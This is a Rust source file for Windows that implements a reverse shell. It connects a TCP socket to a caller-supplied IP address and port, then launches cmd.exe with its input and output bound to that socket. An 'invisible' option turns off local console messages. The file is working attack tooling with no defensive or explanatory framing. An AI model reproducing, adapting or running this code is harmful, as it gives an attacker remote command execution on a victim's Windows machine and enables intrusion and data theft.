
use std::ffi::CStr;
use std::mem;
use std::net::Ipv4Addr;
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Networking::WinSock::{
    connect, htons, WSAStartup,WSASocketA, AF_INET, IN_ADDR, IPPROTO_TCP, SOCKADDR, SOCKADDR_IN, SOCKET, SOCK_STREAM, WSADATA
};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::SystemInformation::GetSystemDirectoryA;
use windows::Win32::System::Threading::{
    CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,WaitForSingleObject,INFINITE
};

const WSASTARTUPVAL: u16 = 514;

pub fn shell(ip: Ipv4Addr, port: u16,invisible:char) {
    let wsa_start_result = unsafe { WSAStartup(WSASTARTUPVAL, &mut WSADATA::default()) };
    if wsa_start_result != 0 {
        panic!("Unable to call WSAStartup")
    }

    let socket = unsafe { WSASocketA(AF_INET.0 as i32, SOCK_STREAM.0, IPPROTO_TCP.0, None, 0, 0) };

    //let h:Ipv4Addr=ip.parse().unwrap();
    let a = IN_ADDR::try_from(ip).unwrap();

    let mut sockaddr_in = SOCKADDR_IN {
        sin_family: AF_INET, 
        ..Default::default()
    };
    sockaddr_in.sin_addr.S_un=a.S_un;
    sockaddr_in.sin_port = unsafe { htons(port) };

    let connection_result = unsafe {
        connect(
            socket,
            &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
            mem::size_of::<SOCKADDR_IN>() as _,
        )
    };
    if connection_result != 0 {
        panic!("Unable to call connect to the remote socket")
    }

    let lp_buffer: &mut [u8] = &mut [0; 50];
    unsafe { GetSystemDirectoryA(Some(lp_buffer)) };
    let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
    let system_dir = system_dir.to_str().unwrap();

     let mut startup_info = STARTUPINFOA {
        cb: mem::size_of::<STARTUPINFOA>() as u32,
        dwFlags: STARTF_USESTDHANDLES,
        ..Default::default()
    };
    let sock_handle = &socket as *const SOCKET as *const HANDLE;
    startup_info.hStdInput = unsafe { *sock_handle };
    startup_info.hStdOutput = unsafe { *sock_handle };
    startup_info.hStdError = unsafe { *sock_handle };
    let lp_application_name=PCSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
    let lp_command_line = PSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
    let mut pi=PROCESS_INFORMATION::default();
    let create_res = unsafe {
        CreateProcessA(
            lp_application_name,
            lp_command_line,
            Some(&SECURITY_ATTRIBUTES::default()),
            Some(&SECURITY_ATTRIBUTES::default()),
            true,
            PROCESS_CREATION_FLAGS::default(),
            None,
            PCSTR::null(),
            &startup_info,
            &mut pi,
        )
    };
   

    match  create_res  {
        Ok(_)=>{
            if invisible=='n'{
                println!("Created {}",pi.dwProcessId);
                println!("Wait for connection end.....");
                unsafe {
                    WaitForSingleObject(pi.hProcess, INFINITE);
                }
                println!("End!!");
            }

        },
        Err(error)=>{
            println!("Error {}",error);
        }
    }

   
}